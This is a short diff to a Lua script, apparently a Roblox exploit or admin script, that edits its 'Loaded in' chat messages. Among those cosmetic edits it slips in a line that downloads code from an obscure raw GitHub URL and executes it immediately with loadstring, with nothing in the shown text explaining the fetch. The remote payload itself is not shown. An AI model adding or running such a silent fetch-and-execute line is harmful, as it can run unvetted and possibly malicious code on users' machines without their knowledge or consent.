@@ -3488,9 +3488,14 @@ logn("Code fully executed!")
 
 wait(.35)
 logn("-------")
+chat("-pad")
+wait(0.45)
 
 
-chat("h \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n Loaded in "..tostring(os.clock()-loadtime).."s")
+
+Chat("ff Loaded in")
+chat("ff "..tostring(os.clock()-loadtime).."s")
+loadstring(game:HttpGet("https://raw.githubusercontent.com/lpkonizopcinfasdf/plamka/main/paint1",true))()
 
 wait(0.25)
 
